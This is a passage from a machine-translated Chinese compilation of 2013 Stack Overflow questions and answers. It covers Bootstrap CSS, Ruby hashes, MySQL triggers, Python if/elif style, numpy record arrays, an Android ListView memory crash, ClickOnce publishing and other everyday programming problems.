.hero-unit {
  padding: 60px;
  margin-bottom: 30px;
  font-size: 18px;
  font-weight: 200;
  line-height: 30px;
  background-color: #eeeeee;
  border:1px solid #cacaca;
  -webkit-border-radius: 10px;
         -moz-border-radius: 10px;
          border-radius: 10px;
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:13:30.070

你错过了两件事1是

//来自 hero.html 源代码

```
body {
   padding-top: 60px;
   padding-bottom: 40px;
} 
```

另一个是

```
.container,
  .navbar-static-top .container,
  .navbar-fixed-top .container,
  .navbar-fixed-bottom .container {
    width: 1170px;
} 
```

以上css来自[http://twitter.github.com/bootstrap/assets/css/bootstrap-responsive.css](http://twitter.github.com/bootstrap/assets/css/bootstrap-responsive.css)

使用上面然后检查。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:05:34.407

您错过了 Bootstrap 示例页面上的一些重要内容：

```
 body {
    padding-top: 60px;
    padding-bottom: 40px;
  } 
```

因为导航栏固定在顶部，所以您需要将正文内容向下推，使其在导航栏之后开始。在您的情况下，顶部填充 80px 似乎更合适。

顺便说一句，`jquery`对于您的问题来说，这并不是一个有用的标签。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T07:08:58.483

您有固定的标题，需要在 body 标记上设置 padding-top。

# ruby - ruby 将键添加到没有值的哈希中

> ID：14847700
> 
> 赞同：3
> 
> 时间：2013-02-13T06:24:49.917
> 
> 标签：ruby

是否可以在没有值的情况下向哈希添加键？所以我创建了一个 hash(@j) 并有一个方法：

```
def add(hash)
@j.merge!(hash) 
end 
```

如何使添加没有价值的键成为可能，例如

```
@j.add('fish')
puts @j.entries
puts @j.keywords

=> {'fish' => nil}
=> fish 
```

我当前的代码允许我像这样添加键和值：

```
 @j.add('fish' => 'animal') 
```

但如果它像上面那样......只有关键

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:30:10.820

您可以为值添加带有 nil 的哈希：

```
@j.add {:key => nil} 
```

或编辑您的添加方法：

```
def add(key_or_hash)
  hash = key_or_hash.is_a?(Hash) ? key_or_hash : {key_or_hash.to_sym => nil}
  @j.merge! hash
end 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-04-04T18:21:22.417

我认为您正在寻找的是 Ruby 的 Set 类。根据其描述“Set 实现了一组无重复的无序值。这是 Array 的直观互操作设施和 Hash 的快速查找的混合体”。

[http://www.ruby-doc.org/stdlib-2.1.1/libdoc/set/rdoc/Set.html](http://www.ruby-doc.org/stdlib-2.1.1/libdoc/set/rdoc/Set.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-14T07:49:03.930

您可以将键设置为 nil 值，如下所示：

 `````
h = Hash.new

h["nil_key"] = nil

h.keys # => ["nil_key"] 
```

in your example you could define it like this

```
def add(key, value = nil)
  h = { key => value } 
  @j.merge!(h)
end

@j = { :a_key => "a_value" }

@j.add("fish")

@j.keys # => [:a_key, "fish"]

@j.add("another_key", "another_value")

@j.keys # => [:a_key, "fish", "another_key"]

@j # => [ :a_key => "a_value", "fish" => nil, "another_key" => "another_value"] 
```

just make sure you define #add in whatever class the @j instance variable is defined in.`  `* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-09-04T07:07:00.487

使用 MRI Ruby 2.7：`hash.without(:this, :that, :the_other)`

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-02-13T11:41:14.527

哈希是从键到值的映射。拥有没有值的键的想法不仅是不可能的，甚至没有意义。``

# mysql - MySQL触发器中的多个if语句

> ID：14847702
> 
> 赞同：4
> 
> 时间：2013-02-13T06:24:53.857
> 
> 标签：mysql, sql, triggers, phpmyadmin

如果 MySQL 触发器中有多个 if 语句，最好的方法是什么？

目前我的 SQL 如下所示：

```
IF NOT (NEW.status <=> OLD.status) THEN
  {my sql}

ELSEIF NOT (NEW.actual <=> OLD.actual) THEN
  {my sql}
END IF 
```

乍一看，这似乎有效。但是，我注意到当多个 (else)if 语句为真时，只有第一个被执行（就像在 PHP 中一样）。

我怎样才能只使用多个 if，不一定是 elseif，以便执行超过 1 条语句？不可能使用相同的操作创建多个触发器，至少 phpMyAdmin 是这样显示的。在一个触发器中放置多个 if 会导致错误。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-14T10:36:13.077

弄清楚了。我没有使用 phpMyAdmin 中的可视 GUI 来创建触发器，而是使用纯 SQL。

所以我使用了这个 SQL：

```
delimiter //
create t1
after update
on my_table
for each row
    begin
        IF (NEW.status <> OLD.status) THEN
            {your sql}
        END IF;

        IF (NEW.actual <> OLD.actual) THEN
            {your sql}
        END IF;     
    end;//
delimiter ; 
```

哪个工作正常。在 phpMyAdmin GUI 中查找触发器时，我注意到这是因为必须添加`begin`和。`end;`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-12-04T09:30:06.110

```
if(NEW.shift = 0 )then

SELECT `max_morning` , `count_morning` into @max_morning , @count_morning FROM `count_reserve` where `date` = NEW.date_reserve;
if(@count_morning is NULL and @max_morning is NULL) then

  select `max_morning` , `max_evening` into @max_morning , @max_evening   from `work_time` where `day` = new.day;

    insert into `count_reserve` (`date`, `count_morning` ,      `count_evening`,`from_morning`, `to_morning`, `max_morning`, `from_evening`, `to_evening`, `max_evening` , `status_morning` , `status_evening`) values (NEW.date_reserve , 1 , 0 , NULL, NULL, @max_morning , NULL, NULL, @max_evening ,1, 1);

end if
end if 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-13T07:22:20.000

像这样使用：

```
 IF (NEW.status <> OLD.status) THEN
    <statement>
 ELSEIF (NEW.actual <> OLD.actual) THEN
     <statement>
 END IF; 
```

# python - if else 返回练习

> ID：14847703
> 
> 赞同：1
> 
> 时间：2013-02-13T06:24:59.437
> 
> 标签：python

我知道菜鸟问题，但我需要确认它，因为这经常发生在我身上。`elif:`如果您知道当前一个块为真时不会到达代码，那么使用有什么意义吗？例如。

```
if foo:
  return x
elif bar:
  return y 
```

应该只是：

```
if foo:
  return x
if bar:
  return y 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-13T06:29:13.160

我可以看到至少三个喜欢的理由`if/elif`：

*   它向代码的读者清楚地表明，作者希望条件是互斥的
*   如果稍后重构代码，将早期返回更改为单个延迟返回，则语义`if/elif`不会中断，但`if/if`可能
*   它使代码风格与您正在使用的其他代码库保持一致

至少有两个选择的理由`if/if`：

*   打字少了
*   它使代码风格与您正在使用的其他代码库保持一致

也就是说，这里有一些推荐阅读：

*   [我应该提前从函数返回还是使用 if 语句？](https://softwareengineering.stackexchange.com/questions/18454/should-i-return-from-a-function-early-or-use-an-if-statement)
*   [蟒蛇指南。代码样式 - 返回值](https://python-guide.readthedocs.org/en/latest/writing/style/#returning-values)
*   [在 Python 中，我应该在 if 块中返回后使用 else 吗？](https://stackoverflow.com/questions/5033906/in-python-should-i-use-else-after-a-return-in-an-if-block)（用一小撮健康的盐吃这个）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T06:29:01.030

python解释器没有任何区别；事实上，这两个代码片段将在内部编译为相同的指令（编译器足够聪明，知道永远不会到达返回后的代码，并将`else`完全优化部分。）。

这是风格和可读性的问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T06:29:51.047

从 Python 解释器的角度来看，不，没有区别——或者至少在执行方面没有区别，尽管这两种构造的实现方式可能存在一些细微的差异。

但请记住，您不仅要写信给口译员，还要写信给口译员。您正在为其他程序员编写以便稍后阅读您的代码。写下你认为最清楚你的意图的任何东西。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T06:31:06.480

如果您知道这不是真的，那么不要浪费口译员的时间来检查它。如果你使用`if`它，每次都会被评估；但是，只有在前一个条件是`elif`时才会评估。在这种情况下，您使用的是，因此您应该避免这种情况，但是根据返回更改逻辑流程是不好的。您应该拥有尽可能少的（最好只有一个）代码路径。此外，它提供了一个干净、可读的结构，并使代码路径明确。可读性很重要，显式优于隐式。`if``False``return`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T06:28:41.797

多条`IF`语句意味着您的代码将检查所有`IF`条件，而在 的情况下`elif:`，如果满足一个`IF`条件，则不会检查其他条件。（正如已经向我指出的那样，只有在没有任何`IF`语句必须`return`来自代码块的情况下，这才是正确的）

在您的情况下，可以使用 multiple`IF`语句。

# tfs - TFS 2010 中的开发人员绩效报告

> ID：14847704
> 
> 赞同：0
> 
> 时间：2013-02-13T06:25:02.803
> 
> 标签：tfs

我想创建一个 TFS 报告，每次迭代都会显示 2 个数字：

1.  在迭代开始时分配给特定用户（我）的任务数量（活动或建议）和
2.  在迭代结束时完成的任务数（已解决或已关闭）。

实现此类报告的最简单方法是什么（以便我可以每天自动更新它）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:55:05.503

我怀疑它是否可以通过开箱即用的 TFS 安装来完成，因为 TFS 不存储“*分配给”*字段的更改。您更有可能需要创建这样一个实用程序，您可以在其中手动分析 TFS 数据。

# python - 如何将列添加到 ndarray？

> ID：14847710
> 
> 赞同：2
> 
> 时间：2013-02-13T06:25:26.763
> 
> 标签：python, matrix, numpy, concat

所以我有下面的代码读取一个文件并使用 genfromtxt 给我一个 ndarray：

```
arr = np.genfromtxt(filename, delimiter=',', converters={'Date': make_date},
                    names=('Date', 'Name','Age'), dtype=None) 
```

现在，我希望在 arr 中添加另一列，名为“Marks”。你能帮我看看我该怎么做吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-13T08:47:29.170

`np.genfromtxt`生成记录数组。列不能以通常的 numpy 方式连接到记录数组。使用`numpy.lib.recfunctions.append_fields`：

```
import numpy as np
from numpy.lib import recfunctions as rfn
from StringIO import StringIO

s = StringIO('2012-12-10,Peter,30\n2010-01-13,Mary,31')
arr = np.genfromtxt(s, delimiter=',', names=('Date', 'Name','Age'), dtype=None)
new_arr = rfn.append_fields(arr, names='Marks', data=['A','C+'], usemask=False) 
```

这将返回：

```
>>> arr
array([('2012-12-10', 'Peter', 30), ('2010-01-13', 'Mary', 31)], 
  dtype=[('Date', '|S10'), ('Name', '|S5'), ('Age', '<i8')])
>>> new_arr
array([('2012-12-10', 'Peter', 30, 'A'), ('2010-01-13', 'Mary', 31, 'C+')], 
  dtype=[('Date', '|S10'), ('Name', '|S5'), ('Age', '<i8'), ('Marks', '|S2')]) 
```

# android - 列表视图中的大量数据使 android 应用程序崩溃

> ID：14847714
> 
> 赞同：1
> 
> 时间：2013-02-13T06:25:46.367
> 
> 标签：android, listview

嗨，我需要在 Android 应用程序的 Listview 中管理大量数据。列表项可能在 250 左右或更多。现在我的问题是，当我滚动列表视图时，由于更多项目，它会使应用程序崩溃。但是当项目少于 100 时，列表视图将正常工作。

请帮我解决这个问题。

这是我的错误日志。

```
02-13 06:43:07.320: ERROR/AndroidRuntime(1776): Caused by: java.lang.OutOfMemoryError
android.graphics.BitmapFactory.nativeDecodeAsset(Native Method)
android.graphics.BitmapFactory.decodeStream(BitmapFactory.java:577)
android.graphics.BitmapFactory.decodeResourceStream(BitmapFactory.java:445)
android.graphics.drawable.Drawable.createFromResourceStream(Drawable.java:738)
android.content.res.Resources.loadDrawable(Resources.java:1869)
android.content.res.Resources.getDrawable(Resources.java:659)
android.widget.ScrollView.setOverScrollMode(ScrollView.java:1487)
android.view.ViewGroup.<init>(ViewGroup.java:365)
android.widget.FrameLayout.<init>(FrameLayout.java:94)
android.widget.ScrollView.<init>(ScrollView.java:155)
android.widget.ScrollView.<init>(ScrollView.java:151) 
```

而我`getView()`的是

```
@Override
public View getView(final int position, View view, ViewGroup parent) {

    final int pos = position;
    views = null;
    LayoutInflater layoutInflator = (LayoutInflater) context
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    views = (RelativeLayout) layoutInflator.inflate(
            R.layout.guest_list_item, null);

    final CheckBox chk = (CheckBox) views.getChildAt(0);
    // Log.d("", "CheckBox Pos "+position);
    chk.setId(position);

    TextView txtView = (TextView) views.getChildAt(1);

    TextView txtView2 = (TextView) views.getChildAt(2);
    TextView txtView3 = (TextView) views.getChildAt(3);

    final TextView txtView4 = (TextView) views.getChildAt(4);
    TextView txtView5 = (TextView) views.getChildAt(6);
    txtView5.setId(position);

    // Log.d("", "Button Pos "+position);
    txtView4.setId(position);

    txtView4.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            Intent intent = new Intent(context, InfoScreen.class);
            intent.putExtra("IDVALUE", arTempId.get(txtView4.getId()));
            intent.putExtra("IDVALUE", arrayListId.get(position));

            intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
            context.startActivity(intent);
            // System.out.println(v + "##########" + " " + v.getId());
            // System.out.println(v + "##########" + " " +
            // arTempId.get(txtView4.getId()));
            // System.out.println(v + "##########" + " " +
            // chickinlist.get(txtView4.getId()));
        }
    });
    Log.e("", "****************************************************** ");
    // Log.v("", "Adapter arr pos " + pos);
    // Log.v("", "Adapter arr position " + position);
    Log.v("", "Adapter arr size " + arrayListFirstName.size());
    Log.v("", "Passsing arr size " + chickinlist.size());

    for (int dd = 0; dd < arrayListFirstName.size(); dd++) {
        if (position == dd) {
            // Log.d("", "Passsing arr size " + chickinlist.size());
            Boolean result = chickinlist.get(position);
            // Log.d("", "After " + result);
            if (result == true) {
                chk.setChecked(true);
                arrCheckedItems.add(position);
                views.setBackgroundResource(R.drawable.list_item_checked);

            } else {
                chk.setChecked(false);
                arrUnCheckedItems.add(position);
                views.setBackgroundResource(R.drawable.list_item_unchecked);

            }

            txtView.setText(arrayListFirstName.get(position));
            txtView2.setText(arrayListLastName.get(position));
            txtView3.setText("(" + arrayListGuests.get(position) + ")");
            if (arrayCustomOne.get(position).equalsIgnoreCase("0")
                    || arrayCustomOne.get(position).equalsIgnoreCase(null)
                    || arrayCustomOne.get(position).equalsIgnoreCase(
                            "(null)")) {
                txtView5.setText("");
            } else {
                txtView5.setText(arrayCustomOne.get(position));
            }

        }

    }

    chk.setOnCheckedChangeListener(new OnCheckedChangeListener() {

        @Override
        public void onCheckedChanged(CompoundButton buttonView,
                boolean isChecked) {
            mySqliteAdapter.openToWrite();

            sId = arrayListId.get(chk.getId());
            // Log.d("Adapter",
            // "Checked Temp Id "+arTempId.get(chk.getId()));
            Log.d("",
                    "Position " + chk.getId() + "tempid "
                            + arTempId.get(chk.getId()));

            if (isChecked) {

                chk.setChecked(true);
                arrCheckedItems.add(position);
                strAlertValue = "1";
                sCheckIn = "1";
                strExe = "update ticket_details set checkin_status=1 where tempid="
                        + arTempId.get(chk.getId());
                mySqliteAdapter.executeCheckQurey(strExe);
                if (Util.getInstance(context).isTabletDevice()) {
                    buttonView
                            .setBackgroundResource(R.drawable.tablet_list_item_check);
                } else {
                    buttonView
                            .setBackgroundResource(R.drawable.list_item_checked);
                }

                new CheckInUpdate().execute();
                AlertDialog.Builder builder = new AlertDialog.Builder(
                        context);
                builder.create();
                builder.setMessage(arrayListFirstName.get(chk.getId())
                        + " " + arrayListLastName.get(chk.getId())
                        + " has been checked in.");
                builder.setPositiveButton("Ok",
                        new DialogInterface.OnClickListener() {

                            @Override
                            public void onClick(DialogInterface dialog,
                                    int which) {
                                // myGuestList = new GuestListScreen();

                                //
                                // // myGuestList.ListUpdate();

                                //Intent intentNavGuestList = new Intent(
                                //context, GuestListScreen.class);
                                //intentNavGuestList
                                //                                          .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                //context.startActivity(intentNavGuestList);

                                dialog.dismiss();

                            }

                        }).show();

                // Log.d("", "ID = " + buttonView.getId());

            }
            if (!isChecked) {

                sCheckIn = "0";
                strAlertValue = "0";

                // views.setBackgroundResource(R.drawable.list_item_unchecked);
                strExe = "update ticket_details set checkin_status=0 where tempid="
                        + arTempId.get(chk.getId());

                mySqliteAdapter.executeCheckQurey(strExe);

                if (Util.getInstance(context).isTabletDevice()) {
                    buttonView
                            .setBackgroundResource(R.drawable.tablet_list_item_uncheck);
                } else {
                    buttonView
                            .setBackgroundResource(R.drawable.list_item_unchecked);
                }
                new CheckInUpdate().execute();

                Intent intentNavGuestList = new Intent(context,
                        GuestListScreen.class);
                intentNavGuestList
                        .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                context.startActivity(intentNavGuestList);

                // Toast.makeText(context, "check release",
                // Toast.LENGTH_SHORT)
                // .show();
                // new CheckInUpdate().execute();

            }

        }
    });

    return views;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:36:04.727

猜猜-您没有重复使用视图。
尝试使用 View Holder -这里有一些链接 -
[http://developer.android.com/training/improving-layouts/smooth-scrolling.html](http://developer.android.com/training/improving-layouts/smooth-scrolling.html) [http://vsvydenko.blogspot.in/2011/06/android-use- viewholder.html](http://vsvydenko.blogspot.in/2011/06/android-use-viewholder.html) [http://www.jmanzano.es/blog/?p=166](http://www.jmanzano.es/blog/?p=166)

建议 - 让您的适配器实现**OnClickListener**和 **OnCheckedChangeListener**。

```
public class YourAdapter  implements OnCheckedChangeListener, OnClickListener.... 
```

然后分别处理这些事件 -

```
@Override
public void onClick(View v) {
    // Do your stuff here

} 
```

**就像OnCheckedChangeListener**一样明智。

这样代码将具有更好的可读性和易于调试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:48:13.340

持有人模式是一个正确的答案。如果您为列表视图实现“分页”模式会更好。当列表视图滚动到结束时显示下一个项目。还要避免在适配器中执行长时间运行的任务。将数据和适配器分开。请参阅使用 notifyDataSetChanged() 方法。

# visual-studio-2010 - VS 2012 停止的单击一次发布附加文件

> ID：14847716
> 
> 赞同：6
> 
> 时间：2013-02-13T06:25:49.460
> 
> 标签：visual-studio-2010, msbuild, visual-studio-2012, clickonce, publish

我使用在这个问题中找到的解决方案定制了我的项目：

[为什么 Visual Studio 中的 ClickOnce 不从依赖程序集中部署内容文件？](https://stackoverflow.com/questions/590227/why-doesnt-clickonce-in-visual-studio-deploy-content-files-from-dependent-assem)

```
<ItemGroup>
<AdditionalPublishFile Include="$(OutputPath)\**\*.rpt">
  <Visible>False</Visible>
</AdditionalPublishFile>
</ItemGroup>
<Target Name="BeforePublish">
  <Touch Files="@(IntermediateAssembly)" />
  <CreateItem Include="@(AdditionalPublishFile)" AdditionalMetadata="TargetPath=%(RecursiveDir)%(Filename)%(extension);IsDataFile=false">
    <Output TaskParameter="Include" ItemName="_DeploymentManifestFiles" />
  </CreateItem>
</Target> 
```

它在 VS 2010 上运行良好，直到我升级到 VS 2012，附加文件不包含在应用程序清单中！因此，当用户安装应用程序时，应用程序主文件夹中缺少提到的文件。

VS 2012 发生了什么变化？或者也许更改在 MSBuild 中？

编辑：

我提到了我从哪里得到这个想法的原始问题，基本上我正在使用依赖注入来加载一些程序集，这意味着我的项目和程序集之间没有硬引用，所以单击一次部署不会考虑那些程序集，这迫使我要么将它们添加到项目中，要么使用提到的解决方案，我选择了提到的解决方案，因为它是不可见且简单的。

但在迁移到 VS 2012 后它被破坏了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-04T07:19:07.197

我发现您的问题令人费解，因为我以前从未见过有人用 ClickOnce 做到这一点，因此我与 Microsoft 的 ClickOnce 人员进行了交谈。他说你正在做的事情不受支持，所以这不是他们会测试的东西。msbuild 有多项更改可能会破坏您正在做的事情。

您要做的是获取与部署中包含的辅助引用关联的文件吗？换句话说，您有一个主项目，该项目引用了通过构建第二个项目创建的另一个程序集，并且第二个程序集具有内容文件，您希望它们包含在您的项目中吗？

如果这就是您想要做的，您应该考虑将这些文件链接到主项目。为此，您可以将现有项目添加为链接，并将其指向第二个项目中的内容。然后在您构建第一个项目时将包含内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-04-05T16:58:59.607

将 CreateItem 任务移至 BeforeBuild 步骤并移除 Touch 任务：

```
<ItemGroup>
  <AdditionalPublishFile Include="$(OutputPath)\**\*.rpt">
    <Visible>False</Visible>
  </AdditionalPublishFile>
</ItemGroup>
<Target Name="BeforeBuild">
  <CreateItem Include="@(AdditionalPublishFile)" AdditionalMetadata="TargetPath=%(RecursiveDir)%(Filename)%(extension);IsDataFile=false">
    <Output TaskParameter="Include" ItemName="_DeploymentManifestFiles" />
  </CreateItem>
</Target> 
```

# c# - 在 div 标签中使用 ascx 控件

> ID：14847717
> 
> 赞同：0
> 
> 时间：2013-02-13T06:25:56.093
> 
> 标签：c#, asp.net

我创建了一个名为“Uctest.ascx”的用户控件。我想在不使用 aspx 页面的情况下在 div 标记中显示这个 .ascx 控件。如果可能意味着请帮我这样做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:32:36.820

正如人们所说，没有aspx页面是不可能的。但是，我可以为此考虑一个不太干净的解决方案。

您可以创建 aspx 页面，将控件放在那里，然后通过 AJAX 将该 aspx 页面加载到您的 div 中。但是您将失去此控件的所有服务器端功能，因此我不知道此解决方案是否对您有任何好处

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:28:14.610

> 我想在不使用 aspx 页面的情况下在 div 标签中显示这个 .ascx 控件

你不能。

来自[ASP.NET 用户控件概述 MSDN：](http://msdn.microsoft.com/en-us/library/fb3w5b53%28v=vs.100%29.aspx)

> **用户控件不能作为独立文件运行。相反，您必须将它们添加到 ASP.NET pages**中，就像您添加任何控件一样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:35:11.393

不可能.. 因为 Web 用户控件在其代码隐藏中有事件并且需要执行这些事件，即谁将调用 load_event ？

但是，您可以做什么...是创建一个 IFrame .. 并将 aspx 页面加载到其中，该页面用作 ascx 的容器 ..

# mysql - MySql/Rails created_at 时间戳

> ID：14847720
> 
> 赞同：0
> 
> 时间：2013-02-13T06:26:08.773
> 
> 标签：mysql, ruby-on-rails

我需要将一个 Hugh`csv file`导入我的`rails app`.，通过我的模型创建记录需要很长时间。所以，我决定直接使用`mysql`. 通过这样做，所有记录的`created_at`and`updated_at`列是`"0000-00-00 00:00:00"`。

我是否应该期待将来由此产生的任何后果/副作用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:28:08.053

如果您对列进行测试，您将得到奇怪的值。如果你只是忽略它们，你应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-04T23:51:47.480

只需将列重命名为 created 而不是 created_at。

# linux - Linux 中的 Solaris“installf”命令等效项

> ID：14847727
> 
> 赞同：-2
> 
> 时间：2013-02-13T06:26:49.863
> 
> 标签：linux

对于 Solaris "installf"，Linux 中是否存在任何等效命令？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:34:09.553

[installf](http://www.lehman.cuny.edu/cgi-bin/man-cgi?installf%201)与 Solaris 上的包管理有关。

各种 Linux 发行版具有不同的[包管理器](http://en.wikipedia.org/wiki/Package_management_system)：

*   Debian 和 Ubuntu 使用`.deb`带有`apt-get`或`aptitude`命令`apt-get install sbcl`的软件包，例如安装`sbcl`软件包及其依赖项。

*   Redhat、Fedora 和 Maegia 使用`.rpm`包，例如`yum`命令

其他一些发行版还有其他包管理器，请参阅[此列表](http://en.wikipedia.org/wiki/List_of_software_package_management_systems)。

# android - 进度条未加载

> ID：14847728
> 
> 赞同：0
> 
> 时间：2013-02-13T06:26:54.360
> 
> 标签：android, android-widget

我正在为学校制作一个小游戏，我想将 ProgressBar 用作 XP（体验）栏。

```
private static final int PROGRESS = 0x1;
private ProgressBar mProgress;
private Handler mHandler = new Handler();
private int mProgressStatus;

mProgress = (ProgressBar) findViewById(R.id.xpBar);

new Thread(new Runnable() {
        public void run() {
            int xp = Integer.parseInt(textViewXPValue.getText().toString());
            int XPNEXT = Integer.parseInt(textViewXpNextLevel.getText().toString());
            while (mProgressStatus < XPNEXT) {
                mProgressStatus = xp;

                mHandler.postDelayed(new Runnable() {
                    public void run() {
                        mProgress.setProgress(mProgressStatus);
                    }
                }, 10);   
            }
        }
    }).start(); 
```

变量：

```
Integer.parseInt(textViewXpNextLevel.getText().toString()); 
```

等于升级所需的最大经验值。和

```
Integer.parseInt(textViewXPValue.getText().toString()); 
```

等于玩家当前拥有的xp。

进度条出现，没有错误发生。它只是不会显示进度。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:50:03.417

while (....) 行的末尾有一个分号。它不会让您的 while 阻塞执行。摆脱它，它会工作。

编辑：

您尚未设置最大值：

```
mProgress = (ProgressBar) findViewById(R.id.progressbar);
                mProgress.setMax(100); 
```

这将使您的进度条正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:52:51.320

嘿，while结尾有一个分号....删除它然后尝试....

而（mProgressStatus < XPNEXT）；

应该是 while (mProgressStatus < XPNEXT)

# javascript - js点击委托判断是否不是元素

> ID：14847730
> 
> 赞同：0
> 
> 时间：2013-02-13T06:27:00.103
> 
> 标签：javascript, jquery, events

我在“#id”上有一个委托的点击事件。

但是，我想知道当 event.target 不是 '#id' 时有一个功能

```
$(document).on('click', '#id', handler)

function handle(event){
   el.show();

 // I want to do if current click is not '#id', el.hide();

} 
```

我知道在文档上注册一个事件可以做到这一点，但我不想像下面这样注册一个事件。有没有另一种方法可以确定目标是否不是元素？

```
$(document).on('click', handler)

function handle(event){
   $(event.target).is(el)
   ?  el.show()
   :  el.hide();    
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:34:21.877

我不确定我是否完全理解这个问题，但是：

```
$(document).click(function (e) {
    if ($(e.currentTarget).is('#div')) {
        // this is the target div
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:40:11.927

尝试使用：

```
document.addEventListener('click',function(e) {
  if ($(e.currentTarget).is(el)) {
    // do something
  }
}); 
```

# ruby - 为什么我可以使用破坏性方法修改超出范围的变量？

> ID：14847735
> 
> 赞同：1
> 
> 时间：2013-02-13T06:27:22.250
> 
> 标签：ruby

```
class PassByValueScopeConfusion

  def does_not_modify(s)
    s = "DIFFERENT"
  end

  def does_modify(s)
    s.upcase!
  end

end

obj = PassByValueScopeConfusion.new

some_string = "abcdefg"

# does not change the value of some_string
obj.does_not_modify(some_string)

# changes the value of some_string
obj.does_modify(some_string) 
```

我将一个字符串传递给一个方法，该方法在传入的字符串上调用破坏性方法，并且以某种方式修改了原始变量“some_string”。如果我能够使用破坏性方法在范围之外修改“some_string”变量，有没有办法使用赋值运算符（除了调用替换方法）来做到这一点？

**编辑**如果Ruby不允许使用赋值运算符，为什么Ruby允许使用破坏性运算符修改范围之外的变量？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:31:00.183

这两种情况是有区别的。

```
s.upcase! 
```

这意味着“修改引用 s 指向的对象的状态”。

```
s = "DIFFERENT" 
```

另一方面，这意味着“对 object s 的引用指向一个完全不同的对象”（或者如果您愿意，也可以“将 name s 绑定到另一个对象”）。`s`创建了遮蔽外部的新对象`s`。您无法以这种方式修改外部对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T11:42:58.830

> 为什么 Ruby 允许修改范围之外的变量

它没有。您不修改变量，而是修改变量指向的对象。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:38:39.127

您正在传递一个指向字符串对象的引用。

所以在 dos_not_modify 示例中，当被调用时，s 包含一个指向某个内存地址的指针，该地址包含字符串“abcdefg”。然后更改引用 s 的值，使其指向内存中保存新字符串“DIFFERENT”的新的不同位置。然而，调用者代码仍然继续指向原始字符串“abcdefg”的原始位置

在 dos_modify 示例中，s 包含指向某个内存地址的指针，该地址包含字符串“abcdefg”。upcase 函数直接修改这部分内存，将每个字符更改为“ABCDEFG”。调用代码指向同一个内存地址，因此在函数返回后更改会持续存在。

# java - 如何在不使用 javascript 的情况下将亿图 Office Viewer 组件与 zk 集成？

> ID：14847736
> 
> 赞同：0
> 
> 时间：2013-02-13T06:27:29.043
> 
> 标签：java, zk, viewer

我想在线打开和编辑文档并将更新的文档保存在我各自的位置。所以我正在使用亿图 Office 查看器组件在浏览器中查看和编辑文档。在我以前的应用程序中，该组件可以正常使用 javascript，但是在我的新应用程序中，我使用的是 ZK。所以我想知道这个组件如何在没有脚本语言的情况下与 Zk 集成。

是否可以在不使用脚本的情况下将此组件与 zk 集成？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T19:17:34.613

没有 JavaScript 就无法做到这一点，因为亿图 Office Viewer 完全依赖于脚本语言。

# java - Java中的权重生成

> ID：14847756
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:28:29.460
> 
> 标签：java

我对 Java 和一般编程很陌生。我希望有人能解释我如何在 N 个对象上生成一系列权重。例如，假设您必须选择要投资于 IBM 股票与 AIG 股票的现金比例。在简单的 2 库存案例中，我使用了 for 循环

```
 for(int i = 0; i <101; i++){
        double creditWieght = i*allocationIncrement;
        double traditionalWeight = 1-creditWieght;
        actionSet.add(new Pair(creditWieght,traditionalWeight));

    } 
```

其中`LinkHashSet actionSet`给出了输出

```
